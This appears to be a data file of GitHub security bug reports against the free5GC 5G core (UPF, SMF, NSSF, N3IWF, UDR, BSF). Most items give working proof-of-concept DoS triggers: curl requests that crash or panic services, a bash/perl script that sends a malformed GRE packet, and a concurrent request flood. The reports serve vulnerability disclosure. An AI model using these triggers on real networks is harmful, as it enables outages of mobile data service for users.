items.title: [Bugs] UPF unconditionally returns SessionEstablishmentResponse(Cause=Accepted) on CreatePDR failure — PFCP/gtp5g state divergence enables silent traffic bypass and user-plane DoS in 5G Core deployments
items.body: ## Bug Decription A SessionEstablishmentRequest containing a CreatePDR grouped IE with a zero-length PDR-ID child IE (wire bytes 00 38 00 00) triggers a silent failure: the UPF logs Est CreatePDR error: failed to parse PDRID but returns Cause=RequestAccepted. The PDR is never installed in the gtp5g kernel module, while sess.PDRIDs[0] is written to the PFCP session table — permanently diverging control-plane state from the data plane with no error reported to the SMF. Impact: A single malformed UDP/8805 packet is sufficient to silently disable user-plane forwarding for any targeted PDU session. All UE traffic is silently dropped in the kernel; the SMF receives no failure indication and will not attempt recovery — the DoS persists for the full lifetime of the session. On teardown, gtp5g reports remove PDR err: no such file or directory, which is also silently discarded. An unauthenticated attacker with access to the N4 network segment can exploit this to cause a targeted or large-scale denial of service against UE data connectivity with no visible alarm on the management plane. Root cause (session.go, handleSessionEstablishmentRequest): err = sess.CreatePDR(i) if err != nil { sess.log.Errorf("Est CreatePDR error: %+v", err) // error discarded — Cause=Accepted returned regardless } ## To Reproduce Steps to reproduce the behavior: 1.Start free5GC normally. 2.Use the following two files for reproduction: Sender script: [free5gc_upf_pdrid_repro.py](https://github.com/user-attachments/files/26660717/free5gc_upf_pdrid_repro.py) Seed/description file: [free5gc_upf_pdrid_seed.json](https://github.com/user-attachments/files/26660719/free5gc_upf_pdrid_seed.json) No additional dependencies required (Python 3.8+ standard library only). 3.Run: python3 free5gc_upf_pdrid_repro.py ## Expected Behavior When CreatePDR fails, the UPF must respond with Cause=RuleCreationModificationFailure and not create the session context. Returning Cause=Accepted for a session whose PDR was never installed in the data plane violates 3GPP TS 29.244 §7.4.4.1 and enables denial of service via a single malformed control-plane packet. ## Screenshots ## Environment free5GC Version: v4.2.1] OS: Ubuntu 22.04 Kernel version: normal go version: normal C compiler version (optional): normal ## Trace Files ### Configuration Files version: 1.0.3 description: UPF initial local configuration pfcp: addr: 127.0.0.8 # IP addr for listening nodeID: 127.0.0.8 # External IP or FQDN can be reached retransTimeout: 1s # retransmission timeout maxRetrans: 3 # the max number of retransmission ### PCAP File [free5gc_upf_pdrid_repro.zip](https://github.com/user-attachments/files/26660729/free5gc_upf_pdrid_repro.zip) ### Log File 2026-04-12T16:01:37.853593558Z [INFO][UPF][PFCP][LAddr:127.0.0.8:8805][CPNodeID:127.0.0.100] New node 2026-04-12T16:01:37.904631744Z [INFO][UPF][PFCP][LAddr:127.0.0.8:8805] handleSessionEstablishmentRequest 2026-04-12T16:01:37.904876188Z [INFO][UPF][PFCP][LAddr:127.0.0.8:8805][CPNodeID:127.0.0.100][CPSEID:0x2f01][UPSEID:0x1] New session 2026-04-12T16:01:37.905697030Z [ERRO][UPF][PFCP][LAddr:127.0.0.8:8805][CPNodeID:127.0.0.100][CPSEID:0x2f01][UPSEID:0x1] Est CreatePDR error: unexpected EOF CreatePDR: failed to parse PDRID github.com/free5gc/go-upf/internal/forwarder.(*Gtp5g).CreatePDR /home/fei/free5gc/NFs/upf/internal/forwarder/gtp5g.go:423 github.com/free5gc/go-upf/internal/pfcp.(*Sess).CreatePDR /home/fei/free5gc/NFs/upf/internal/pfcp/node.go:130 github.com/free5gc/go-upf/internal/pfcp.(*PfcpServer).handleSessionEstablishmentRequest /home/fei/free5gc/NFs/upf/internal/pfcp/session.go:83 github.com/free5gc/go-upf/internal/pfcp.(*PfcpServer).reqDispacher /home/fei/free5gc/NFs/upf/internal/pfcp/dispacher.go:21 github.com/free5gc/go-upf/internal/pfcp.(*PfcpServer).main /home/fei/free5gc/NFs/upf/internal/pfcp/pfcp.go:156 runtime.goexit /home/fei/go/pkg/mod/golang.org/toolchain@v0.0.1-go1.25.5.linux-amd64/src/runtime/asm_amd64.s:1693 2026-04-12T16:01:37.957481394Z [INFO][UPF][PFCP][LAddr:127.0.0.8:8805] handleSessionDeletionRequest 2026-04-12T16:01:37.957564415Z [INFO][UPF][PFCP][LAddr:127.0.0.8:8805][CPNodeID:127.0.0.100][CPSEID:0x2f01][UPSEID:0x1] sess deleted 2026-04-12T16:01:37.958435484Z [ERRO][UPF][PFCP][LAddr:127.0.0.8:8805][CPNodeID:127.0.0.100][CPSEID:0x2f01][UPSEID:0x1] remove PDR err: no such file or directory

items.title: [Bugs] SMF UPI `POST /upi/v1/upNodesLinks` exits the SMF process on overlapping UE pools
items.body:
## Bug Decription
`SMF` exposes `UPI` without inbound auth:

- unauthenticated `UPI` route group:
  - `NFs/smf/internal/sbi/server.go:76`
  - `NFs/smf/internal/sbi/server.go:78`

The create or update handler accepts arbitrary user-plane topology input and passes it directly into `UpNodesFromConfiguration()`:

- `NFs/smf/internal/sbi/api_upi.go:60`
- `NFs/smf/internal/sbi/api_upi.go:72`

`UpNodesFromConfiguration()` contains multiple `logger.InitLog.Fatalf(...)` paths reachable from attacker-controlled JSON. One confirmed path is the overlap check:

```go
if isOverlap(allUEIPPools) {
    logger.InitLog.Fatalf("overlap cidr value between UPFs")
}
```

Code evidence:

- pool parsing:
  - `NFs/smf/internal/context/user_plane_information.go:413`
- overlap validation:
  - `NFs/smf/internal/context/user_plane_information.go:479`

In Docker validation on March 22, 2026 local time (`2026-03-21T23:47:07Z` in logs), a no-token `POST /upi/v1/upNodesLinks` that added a new `UPF` with `pool=10.60.0.0/16` overlapping the default `UPF` caused:

- client-side `curl: (52) Empty reply from server`
- `smf` log line `[FATA][SMF][Init] overlap cidr value between UPFs`
- `smf` container state `Exited (1)`

This is an unauthenticated crash DoS on the management plane. Unlike the callback and nil-deref cases, this path terminates the whole `SMF` process instead of only returning `500` from Gin recovery.

## To Reproduce
Steps to reproduce the behavior:

1. Send a no-token overlapping-UPF request:

```bash
curl -i -X POST http://10.100.200.6:8000/upi/v1/upNodesLinks \
  -H 'Content-Type: application/json' \
  --data '{"links":[{"A":"gNB1","B":"UPF-OVERLAP-20260322"}],"upNodes":{"UPF-OVERLAP-20260322":{"type":"UPF","nodeID":"198.51.100.20","addr":"198.51.100.20","sNssaiUpfInfos":[{"sNssai":{"sst":1,"sd":"010203"},"dnnUpfInfoList":[{"dnn":"internet","pools":[{"cidr":"10.60.0.0/16"}]}]}]}}}'
```

Observed output:

```text
curl: (52) Empty reply from server
```

2. Confirm the container exited:

```bash
docker ps -a --filter name=smf --format '{{.Names}}\t{{.Status}}'
```

Observed output:

```text
smf    Exited (1) 9 seconds ago
```

3. Inspect `smf` logs:

```bash
docker logs --tail 80 smf 2>&1
```

Observed output includes:

```text
2026-03-21T23:47:07.296961556Z [FATA][SMF][Init] overlap cidr value between UPFs
```

## Expected Behavior
Malformed or conflicting `UPI` topology updates should return a controlled client error such as `400 Bad Request` or `409 Conflict`.

Expected behavior:

- no-token `UPI` write -> `401` or `403`
- overlapping pool input -> controlled validation failure
- no `Fatalf`, no process exit, no dropped SBI service

## Screenshots
N/A

## Environment
**Please, complete the following information:**
- free5GC Version: `v4.2.1`
- Runtime image: `free5gc/smf:v4.2.1`
- Runtime SMF commit hash: `8385c00a`
- Validation date: March 22, 2026 local time (`2026-03-21T23:47:07Z` in container logs)
- OS: `Ubuntu 22.04 LTS`
- Kernel version: `5.15.0-88-generic`
- go version: `go1.24.9 linux/amd64`
- C compiler version (optional): `gcc (Ubuntu 11.2.0-19ubuntu1) 11.2.0`

## Trace Files
### Configuration Files
No source patch or persistent configuration change was required for this reproduction. The issue was observed against the stock Docker-based `SMF` runtime for free5GC `v4.2.1`.

### PCAP File
Not attached in this report.

### Log File
Relevant `docker logs --tail 80 smf` excerpts:

```text
2026-03-21T23:47:07.296961556Z [FATA][SMF][Init] overlap cidr value between UPFs
```

## System Architecture (Optional)
Docker-based free5GC lab on the internal SBI network:

- source host issuing PoCs: `10.100.200.1`
- SMF: `10.100.200.6:8000`

## Walkthrough (Optional)
The broader `UPI` auth gap already allows unauthenticated writes, but this report isolates a stronger sink. A single unauthenticated `POST /upi/v1/upNodesLinks` can inject an overlapping UE pool that reaches `logger.InitLog.Fatalf(...)` inside topology parsing and terminates the entire `smf` process.

## Additional Context
- This report extends issue `#887` from unauthenticated `UPI` reachability to a concrete unauthenticated process-exit sink.
- This crash primitive extends beyond the single overlap check. The same unauthenticated `UPI POST` path also contains other attacker-reachable `Fatalf(...)` calls for invalid pools and static-pool exclusion failures:
  - `NFs/smf/internal/context/user_plane_information.go:416`
  - `NFs/smf/internal/context/user_plane_information.go:424`
  - `NFs/smf/internal/context/user_plane_information.go:430`

items.title: [Bugs] NSSF `nnssf-nsselection` `GET /network-slice-information` also panics when `slice-info-request-for-pdu-session.sNssai` is null on supported `TAI` and `HPLMN` paths
items.body:
## Bug Decription
This report extends the already-confirmed `nnssf-nsselection` PDU-session crash family.

When `slice-info-request-for-registration` is absent, `NSSF` dispatches to the PDU-session path:

```go
if param.SliceInfoRequestForRegistration != nil {
    status, response, problemDetails = nsselectionForRegistration(param)
} else {
    status, response, problemDetails = nsselectionForPduSession(param)
}
```

Inside `nsselectionForPduSession()`, later branches assume `slice-info-request-for-pdu-session.sNssai` is non-nil and dereference it without checking.

Local validation on March 22, 2026 confirmed two authenticated single-request variants in the same bug family:

1. supported `tai` + `slice-info-request-for-pdu-session={"sNssai":null}` reaches the sink at `nsselection_network_slice_information.go:596`
2. supported `home-plmn-id` + `slice-info-request-for-pdu-session={}` or `{"sNssai":null,"roamingIndication":"LOCAL_BREAKOUT"}` reaches the sink at `nsselection_network_slice_information.go:661`

Relevant source evidence:

- route handler:
  - `NFs/nssf/internal/sbi/api_nsselection.go:35`
  - `NFs/nssf/internal/sbi/api_nsselection.go:53`
- dispatch:
  - `NFs/nssf/internal/sbi/processor/nsselection_network_slice_information.go:104`
  - `NFs/nssf/internal/sbi/processor/nsselection_network_slice_information.go:109`
- supported-`TAI` null `sNssai` sink:
  - `NFs/nssf/internal/sbi/processor/nsselection_network_slice_information.go:595`
  - `NFs/nssf/internal/sbi/processor/nsselection_network_slice_information.go:596`
- supported-`HPLMN` null `sNssai` sink:
  - `NFs/nssf/internal/sbi/processor/nsselection_network_slice_information.go:661`

This is a request-level panic DoS on the NS selection path. In this lab Gin recovery converted the panic into `500`, but the route remains remotely panicable and repeatedly triggerable.

## To Reproduce
Steps to reproduce the behavior:

1. Obtain a valid `nnssf-nsselection` token:

```bash
curl -sS -X POST 'http://10.100.200.3:8000/oauth2/token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'grant_type=client_credentials&nfType=NEF&nfInstanceId=eb9990de-4cd3-41b0-b5d9-c2102b088c57&targetNfType=NSSF&scope=nnssf-nsselection'
```

2. Trigger the supported `TAI` variant:

```bash
curl -G -i 'http://10.100.200.8:8000/nnssf-nsselection/v2/network-slice-information' \
  -H 'Authorization: Bearer <valid_nnssf_nsselection_jwt>' \
  --data-urlencode 'nf-type=AMF' \
```

items.title: [Bugs] N3IWF GRE Unmarshal performs zero bounds checking on input buffer, Fatalf kills entire process, causing DoS
items.body:
## Bug Decription

A remote, authenticated attacker can crash the `N3IWF` process by sending a short GRE packet with length smaller than 4 bytes through the live NWu user-plane IPsec tunnel. `GREPacket.Unmarshal()` performs no bounds checking before reading `b[0]`, `b[1]`, and `b[2:4]`. The panic is then caught by the `forwardUL()` recover block, which calls `nwuupLog.Fatalf(...)` and terminates the whole process with `os.Exit(1)`.

Crash site in `n3iwf/internal/gre/message.go`:

```go
func (p *GREPacket) Unmarshal(b []byte) error {
    p.flags = b[0]
    p.version = b[1]
    p.protocolType = binary.BigEndian.Uint16(b[2:4])
    if p.GetKeyFlag() {
        p.key = binary.BigEndian.Uint32(b[offset:offset+4])
    }
}
```

Fatal recovery in `n3iwf/internal/nwuup/server.go`:

```go
defer func() {
    if p := recover(); p != nil {
        nwuupLog.Fatalf("panic: %v\n%s", p, string(debug.Stack()))
    }
}()
```

## To Reproduce

Steps to reproduce the behavior:

1. Prepare a live free5GC `v4.2.1` lab with `N3IWF`, `UPF`, `amf`, `n3iwf`, and `n3iwue` containers, and make sure the host has the `gtp5g` kernel module loaded.
2. Run command `test_n3iwf_nwuup_short_gre_fatal_dos.sh`.
4. The script restarts `amf` and `n3iwf`, cleans prior `n3iwue` state, starts a real `n3iwue`, waits until the log shows `PduSession Created`, confirms that `ipsec-2` exists, and then sends a 2-byte GRE payload `0x20 0x00` to `10.0.0.1` through `ipsec-2`.
5. During live Docker validation on `2026-04-04 UTC`, the script observed `sent-short-gre`, and `n3iwf` changed from `status=running running=true restart=0 exit=0` to `status=exited running=false restart=0 exit=1` with `finished=2026-04-04T06:51:14.800282681Z`.

Validated live reproduction command:

```bash
test_n3iwf_nwuup_short_gre_fatal_dos.sh
```

PoC script used in live Docker validation:

```bash
#!/usr/bin/env bash
set -euo pipefail

REPO_ROOT="/home/ubuntu/free5gc_v421/free5gc"
N3UE_LOG="/tmp/n3iwue_nwuup_short_gre.log"

cleanup_n3ue() {
  docker exec n3iwue sh -lc 'for pid in $(pgrep -f "/n3iwue" 2>/dev/null || true); do if [ "$pid" != "$$" ]; then kill "$pid" 2>/dev/null || true; fi; done; sleep 1'
  docker exec n3iwue sh -lc "cd /n3iwue && ./clean.sh >/tmp/n3iwue_clean.log 2>&1 || true"
}

wait_for_user_plane() {
  local timeout_secs="$1"
  local deadline=$((SECONDS + timeout_secs))

  while (( SECONDS < deadline )); do
    if docker exec n3iwue sh -lc "test -f '$N3UE_LOG' && grep -q 'PduSession Created' '$N3UE_LOG'"; then
      return 0
    fi
    sleep 1
  done

  return 1
}

cd "$REPO_ROOT"
trap cleanup_n3ue EXIT

echo "[*] restarting amf and n3iwf"
docker restart amf >/dev/null
docker restart n3iwf >/dev/null
sleep 3

echo "[*] cleaning previous n3iwue state"
cleanup_n3ue
docker exec n3iwue sh -lc "rm -f '$N3UE_LOG'"

start_ts="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo "[*] trigger timestamp: $start_ts"

echo "[*] starting real n3iwue inside container"
docker exec -d n3iwue sh -lc "cd /n3iwue && ./n3iwue >'$N3UE_LOG' 2>&1"
sleep 1

echo "[*] waiting for user-plane setup"
if ! wait_for_user_plane 60; then
  echo "[!] n3iwue did not reach 'PduSession Created' within 60 seconds"
  echo "[*] recent n3iwue log"
  docker exec n3iwue sh -lc "tail -n 120 '$N3UE_LOG' 2>/dev/null || true"
  exit 1
fi

echo "[*] confirmed user-plane setup"
docker exec n3iwue sh -lc "ip -4 addr; ip xfrm state; ip link show type xfrm; ip link show type gre" >/tmp/n3iwue_short_gre_state.out 2>&1 || true
cat /tmp/n3iwue_short_gre_state.out

echo "[*] n3iwf status before trigger"
docker inspect n3iwf --format 'status={{.State.Status}} running={{.State.Running}} restart={{.RestartCount}} exit={{.State.ExitCode}} started={{.State.StartedAt}} finished={{.State.FinishedAt}}'

echo "[*] sending 2-byte GRE payload through ipsec-2"
docker exec n3iwue perl -MSocket -e 'use constant SO_BINDTODEVICE => 25; socket(my $s, AF_INET, SOCK_RAW, 47) or die "socket: $!\n"; setsockopt($s, SOL_SOCKET, SO_BINDTODEVICE, "ipsec-2\0") or die "bindtodev: $!\n"; bind($s, sockaddr_in(0, inet_aton("10.0.0.2"))) or die "bind: $!\n"; my $dst = sockaddr_in(0, inet_aton("10.0.0.1")); send($s, "\x20\x00", 0, $dst) or die "send: $!\n"; print "sent-short-gre\n";'

sleep 1

echo "[*] n3iwf status after trigger"
docker inspect n3iwf --format 'status={{.State.Status}} running={{.State.Running}} restart={{.RestartCount}} exit={{.State.ExitCode}} started={{.State.StartedAt}} finished={{.State.FinishedAt}}'

echo "[*] recent n3iwf logs"
docker logs --since "$start_ts" --tail 160 n3iwf 2>&1
```

## Expected Behavior

`N3IWF` should validate that the GRE buffer length is at least 4 bytes before reading `b[0]`, `b[1]`, and `b[2:4]`, and at least 8 bytes before reading the key field when the GRE key flag is set. The `forwardUL()` recover path should log a non-fatal error instead of calling `Fatalf`.

## Environment

- OS: `Ubuntu 24.04.2 LTS`
- Kernel version: `6.14.0-37-generic`
- go version: `go1.26.1 linux/amd64`
- runtime N3IWF build: `commit hash 8fc08a09`, `go1.25.5 linux/amd64`

items.title: [Bugs] UDR nudr-dr GET /subscription-data/{ueId}/{servingPlmnId}/provisioned-data panics when SM data exists
items.body:
## Bug Decription
`UDR`'s `GET /nudr-dr/v2/subscription-data/{ueId}/{servingPlmnId}/provisioned-data` path is single-request panicable in the default lab data state.

The handler is exposed here:

```go
{
    "QueryProvisionedData",
    strings.ToUpper("Get"),
    "/subscription-data/:ueId/:servingPlmnId/provisioned-data",
    s.HandleQueryProvisionedData,
}
```

Inside `QueryProvisionedDataProcedure()`, `provisionedDataSets` is passed by value with every field still nil. When SM subscription data exists in MongoDB, the code decodes it and then writes into `provisionedDataSets.SmData.IndividualSmSubsData` without first allocating `SmData`:

```go
var provisionedDataSets models.ProvisionedDataSets
...
provisionedDataSets.SmData.IndividualSmSubsData = tmp
```

But `models.ProvisionedDataSets` defines `SmData` as a pointer:

```go
SmData *SmSubsData
```

So a normal GET request against a subscriber that has provisioned SM data triggers:

```text
panic: runtime error: invalid memory address or nil pointer dereference
```

Code evidence:

- route exposure:
  - `NFs/udr/internal/sbi/api_datarepository.go:344`
  - `NFs/udr/internal/sbi/api_datarepository.go:346`
  - `NFs/udr/internal/sbi/api_datarepository.go:347`
- handler entry:
  - `NFs/udr/internal/sbi/api_datarepository.go:1671`
  - `NFs/udr/internal/sbi/api_datarepository.go:1684`
- panic root cause:
  - `NFs/udr/internal/sbi/processor/provisioned_data_document.go:100`
  - `NFs/udr/internal/sbi/processor/provisioned_data_document.go:111`
  - `NFs/udr/internal/sbi/processor/provisioned_data_document.go:130`
- nil field type:
  - `/home/ubuntu/go/pkg/mod/github.com/free5gc/openapi@v1.2.3/models/model_provisioned_data_sets.go:20`

Local Docker validation on March 22, 2026 confirmed:

1. obtain a valid `nudr-dr` token
2. send one GET request to `/nudr-dr/v2/subscription-data/imsi-208930000000003/20893/provisioned-data`
3. `UDR` returns `500`
4. logs show a nil-pointer panic in `QueryProvisionedDataProcedure()`

In this lab Gin recovery converted the panic into `500`, but the endpoint is still single-request panicable and repeatedly triggerable for DoS.

## To Reproduce
Steps to reproduce the behavior:

1. Obtain a valid `nudr-dr` token:

```bash
curl -sS -X POST 'http://10.100.200.3:8000/oauth2/token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'grant_type=client_credentials&nfType=NEF&nfInstanceId=eb9990de-4cd3-41b0-b5d9-c2102b088c57&targetNfType=UDR&scope=nudr-dr'
```

2. Trigger the panic with one request:

```bash
curl -i -sS \
  'http://10.100.200.11:8000/nudr-dr/v2/subscription-data/imsi-208930000000003/20893/provisioned-data' \
  -H 'Authorization: Bearer <valid_nudr_dr_jwt>'
```

Observed output:

```text
HTTP/1.1 500 Internal Server Error
Content-Length: 0
```

3. Inspect `udr` logs:

```bash
docker logs --tail 40 udr 2>&1
```

Observed output includes:

```text
[ERRO][UDR][GIN] panic: runtime error: invalid memory address or nil pointer dereference
github.com/free5gc/udr/internal/sbi/processor.(*Processor).QueryProvisionedDataProcedure
/go/src/free5gc/NFs/udr/internal/sbi/processor/provisioned_data_document.go:130
[INFO][UDR][GIN] | 500 | 10.100.200.1 | GET | /nudr-dr/v2/subscription-data/imsi-208930000000003/20893/provisioned-data |
```

## Expected Behavior
If SM data exists, `UDR` should allocate `provisionedDataSets.SmData` before writing into it and return a normal `200` response.

Expected behavior:

- no nil dereference while assembling `ProvisionedDataSets`
- no panic and no stack trace
- successful aggregated response for a subscriber with provisioned SM data

items.title: [Bugs] BSF cleanup race with unprotected map access
items.body:
## Bug Decription
`BSF`'s background cleanup goroutine reads `BSFContext.PcfBindings` **without holding `c.mutex`**, while every PCF-binding SBI handler (POST / GET / PATCH / DELETE) writes to the same map under the proper lock. Once any binding has been inactive for `MaxInactiveTime` (1 h by default) and the periodic `CleanupTicker` fires (every 10 min), the cleanup loop logs a "deleting inactive PCF binding" line that re-reads the map without a lock. Concurrent writes from a normal SBI client at that moment produce one of two process-fatal panics:

1. **`fatal error: concurrent map read and map write`** — Go runtime detects concurrent map mutation and aborts the whole process.
2. **`runtime error: invalid memory address or nil pointer dereference`** — if an attacker's `DELETE /nbsf-management/v1/pcfBindings/{id}` removes the binding between the cleanup's RUnlock and the unprotected read, `c.PcfBindings[bindingId]` returns nil, and `.LastAccessTime` panics.

Either way the cleanup goroutine has **no panic recovery** (`StartCleanupRoutine` spawns it with no `defer recover()`), so the unrecovered panic terminates the entire BSF process — a true crash DoS, not just a 500.

The faulty call site:

```go
// internal/context/context.go (deployed v4.2.2 image — line 588;
//                              latest upstream master commit 2779085 — line 567)
for _, bindingId := range inactiveBindings {
    logger.CtxLog.Infof("Deleting inactive PCF binding: %s (last access: %v ago)",
        bindingId, now.Sub(c.PcfBindings[bindingId].LastAccessTime))   // <-- unsafe map+pointer read
    c.DeletePcfBinding(bindingId)
}
```

The `inactiveBindings` slice was collected under `c.mutex.RLock()` (lines 564-576) and the lock released at line 577. The subsequent re-read at line 588 has **no lock at all**, while every other SBI path (`CreatePcfBinding`, `DeletePcfBinding`, `UpdatePcfBinding`, `QueryPcfBindings`'s MongoDB-fallback write at line 881) takes `c.mutex.Lock()` to mutate the same map. Go's runtime requires that concurrent map operations be serialized; violating that triggers `fatal error: concurrent map read and map write` and exits the process.

Relevant code references (deployed `v4.2.2` and **also** unfixed in the latest upstream master commit `2779085`):
- `NFs/bsf/internal/context/context.go:588` — unsafe `c.PcfBindings[bindingId].LastAccessTime` read
- `NFs/bsf/internal/context/context.go:577` — RUnlock immediately above (so the access is unguarded)
- `NFs/bsf/internal/context/context.go:511-523` — `StartCleanupRoutine` spawns the goroutine **without `defer recover()`** so any panic in `CleanupExpiredBindings` kills the BSF process
- `NFs/bsf/internal/context/context.go:281` — `CreatePcfBinding` writes the same map under `c.mutex.Lock()`
- `NFs/bsf/internal/context/context.go:417` — `DeletePcfBinding` calls `delete(c.PcfBindings, bindingId)` under `c.mutex.Lock()`
- `NFs/bsf/internal/context/context.go:881` — `QueryPcfBindings`'s MongoDB-cache-write path

This is **distinct** from free5gc/free5gc#926 (`PUT /subscriptions/{subId}` race on the unsynchronised `Subscriptions[subId] = subscription` write). #926 was patched upstream by `2779085 fix: PUT subid does not exists` (returns 404 when the sub does not exist). The PCF-binding cleanup race is **still unfixed** at master.

## To Reproduce
Steps to reproduce the behavior:

1. Start free5GC `v4.2.2` Docker deployment with BSF reachable on its SBI port (`10.100.200.11:8000` in the lab). Note the hardcoded defaults (`bsf/internal/context/context.go:52-54`):
   - `DefaultBindingTTL = 24 * time.Hour`
   - `CleanupInterval = 10 * time.Minute`
   - `MaxInactiveTime = 1 * time.Hour`

2. Obtain a valid `nbsf-management` access token from any registered NF profile (the lab AMF works):

```bash
TOKEN=$(curl -s -X POST 'http://10.100.200.4:8000/oauth2/token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'grant_type=client_credentials' \
  --data-urlencode 'nfType=AMF' \
  --data-urlencode 'nfInstanceId=09c2c82b-4ed5-43df-b0fc-c7098d1fa5a0' \
  --data-urlencode 'targetNfType=BSF' \
  --data-urlencode 'scope=nbsf-management' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["access_token"])')
```

3. Create one or more PCF bindings and **stop accessing them** so they go inactive:

```bash
BID=$(curl -s -X POST "http://10.100.200.11:8000/nbsf-management/v1/pcfBindings" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  --data '{"supi":"imsi-208930000000001","ipv4Addr":"10.0.0.1","dnn":"internet","snssai":{"sst":1,"sd":"010203"}}' \
  -i | grep -i Location | awk -F/ '{print $NF}' | tr -d '\r')
echo "Binding ID: $BID"
```

4. Wait until the binding's `LastAccessTime` is older than `MaxInactiveTime` (1 hour). The cleanup ticker fires every 10 minutes after BSF startup. Time the next-window from BSF startup `+ k*10 min` (visible in `docker logs bsf | grep "Starting PCF binding cleanup routine"`).

5. **Within the cleanup window**, drive concurrent POST/DELETE traffic on `/pcfBindings`:

```bash
# Spam POST and DELETE on /pcfBindings while CleanupExpiredBindings is iterating inactiveBindings.
# 200+ goroutines x ~200 req/s for ~5s consistently catches the unprotected access at line 588.
for i in $(seq 1 500); do
  curl -s --max-time 2 -X POST "http://10.100.200.11:8000/nbsf-management/v1/pcfBindings" \
    -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
    --data '{"supi":"imsi-2","ipv4Addr":"10.0.0.99","dnn":"i","snssai":{"sst":1}}' -o /dev/null &
  curl -s --max-time 2 -X DELETE "http://10.100.200.11:8000/nbsf-management/v1/pcfBindings/$BID" \
    -H "Authorization: Bearer $TOKEN" -o /dev/null &
done
wait
```

6. Observe the BSF container exit (or restart loop). `docker ps` shows BSF in `Restarting` / `Exited` state, and `docker logs bsf` ends with one of:

```text
fatal error: concurrent map read and map write
goroutine N [running]:
github.com/free5gc/bsf/internal/context.(*BSFContext).CleanupExpiredBindings(...)
        /go/src/free5gc/NFs/bsf/internal/context/context.go:588 +0x...
```

or:

```text
panic: runtime error: invalid memory address or nil pointer dereference
github.com/free5gc/bsf/internal/context.(*BSFContext).CleanupExpiredBindings(...)
        /go/src/free5gc/NFs/bsf/internal/context/context.go:588 +0x...
```

The cleanup goroutine has no `defer recover()`, so once it panics the runtime tears the whole BSF process down.

## Expected Behavior
- The "deleting inactive PCF binding" log line at `context.go:588` should not re-read `c.PcfBindings[bindingId]` outside the mutex. Either snapshot `LastAccessTime` together with `bindingId` while still under the RLock, or take an explicit `c.mutex.RLock()` around the read.
- `StartCleanupRoutine`'s goroutine must `defer recover()` so that a future regression in `CleanupExpiredBindings` cannot tear down the BSF process. Any recoverable panic should be logged and the next tick should still fire.
- `BSF` should treat all map mutations of `PcfBindings`, `PcfForUeBindings`, `PcfMbsBindings`, `Subscriptions` as needing exclusive `c.mutex.Lock()`; spot-check the cleanup-related code paths under `-race` and run `go test -race ./...` regularly to catch regressions of this class.

## Environment
- free5GC Version: `v4.2.2`
- BSF binary: `free5gc/bsf:v4.2.2`.
- OS: `Ubuntu 22.04 LTS`
- Kernel version: `6.14.0-37-generic`
- go version: `go1.25.5 linux/amd64`

items.title: [Bugs] UDR nudr-dr DELETE /subscription-data/{ueId}/{servingPlmnId}/ee-subscriptions/{subsId}/amf-subscriptions panics when UE state exists but subsId is missing
items.body:
## Bug Decription
`UDR` exposes a second single-trigger panic condition on the same `amf-subscriptions` delete route after minimal state setup.

If an attacker first creates any EE subscription for a chosen `ueId`, `UDR` allocates a `UESubsCollection` entry and an `EeSubscriptionCollection` map entry:

```go
if !ok {
    udrSelf.UESubsCollection.Store(ueId, new(udr_context.UESubsData))
    value, _ = udrSelf.UESubsCollection.Load(ueId)
}
...
UESubsData.EeSubscriptionCollection[newSubscriptionID] = new(udr_context.EeSubscriptionCollection)
```

Later, `DELETE /nudr-dr/v2/subscription-data/{ueId}/{servingPlmnId}/ee-subscriptions/{subsId}/amf-subscriptions` loads that UE state but still mishandles a missing `subsId`:

```go
_, ok = UESubsData.EeSubscriptionCollection[subsId]
if !ok {
    pd = util.ProblemDetailsNotFound("SUBSCRIPTION_NOT_FOUND")
}

if UESubsData.EeSubscriptionCollection[subsId].AmfSubscriptionInfos == nil {
    pd = util.ProblemDetailsNotFound("AMFSUBSCRIPTION_NOT_FOUND")
}
```

When `subsId` is absent, `UESubsData.EeSubscriptionCollection[subsId]` is nil and the next line dereferences it, causing:

```text
panic: runtime error: invalid memory address or nil pointer dereference
```

This is still a single triggering request on the vulnerable endpoint; the only prerequisite is one earlier EE-subscription create to populate in-memory UE state.

Code evidence:

- precondition route and handler:
  - `NFs/udr/internal/sbi/api_datarepository.go:600`
  - `NFs/udr/internal/sbi/api_datarepository.go:602`
  - `NFs/udr/internal/sbi/api_datarepository.go:2528`
  - `NFs/udr/internal/sbi/processor/event_exposure_subscriptions_collection.go:25`
  - `NFs/udr/internal/sbi/processor/event_exposure_subscriptions_collection.go:30`
  - `NFs/udr/internal/sbi/processor/event_exposure_subscriptions_collection.go:38`
- vulnerable delete route:
  - `NFs/udr/internal/sbi/api_datarepository.go:2161`
  - `NFs/udr/internal/sbi/api_datarepository.go:2172`
- panic root cause:
  - `NFs/udr/internal/sbi/processor/event_amf_subscription_info_document.go:62`
  - `NFs/udr/internal/sbi/processor/event_amf_subscription_info_document.go:64`
  - `NFs/udr/internal/sbi/processor/event_amf_subscription_info_document.go:69`

Local Docker validation on March 22, 2026 confirmed:

1. restart `udr`
2. obtain a valid `nudr-dr` token
3. create one EE subscription for `ueId=x`
4. send `DELETE /nudr-dr/v2/subscription-data/x/bad/ee-subscriptions/x/amf-subscriptions`
5. `UDR` returns `500`
6. logs show a nil-pointer panic at `event_amf_subscription_info_document.go:69`

In this lab Gin recovery converted the panic into `500`, but the endpoint remains repeatedly panicable and usable for DoS.

## To Reproduce
Steps to reproduce the behavior:

1. Restart `UDR`:

```bash
docker restart udr
```

2. Obtain a valid `nudr-dr` token:

```bash
curl -sS -X POST 'http://10.100.200.3:8000/oauth2/token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'grant_type=client_credentials&nfType=NEF&nfInstanceId=eb9990de-4cd3-41b0-b5d9-c2102b088c57&targetNfType=UDR&scope=nudr-dr'
```

3. Create one EE subscription to populate `UESubsCollection`:

```bash
curl -i -sS -X POST \
  'http://10.100.200.11:8000/nudr-dr/v2/subscription-data/x/context-data/ee-subscriptions' \
  -H 'Authorization: Bearer <valid_nudr_dr_jwt>' \
  -H 'Content-Type: application/json' \
  --data '{}'
```

Observed output:

```text
HTTP/1.1 201 Created
```

4. Trigger the panic using a nonexistent `subsId`:

```bash
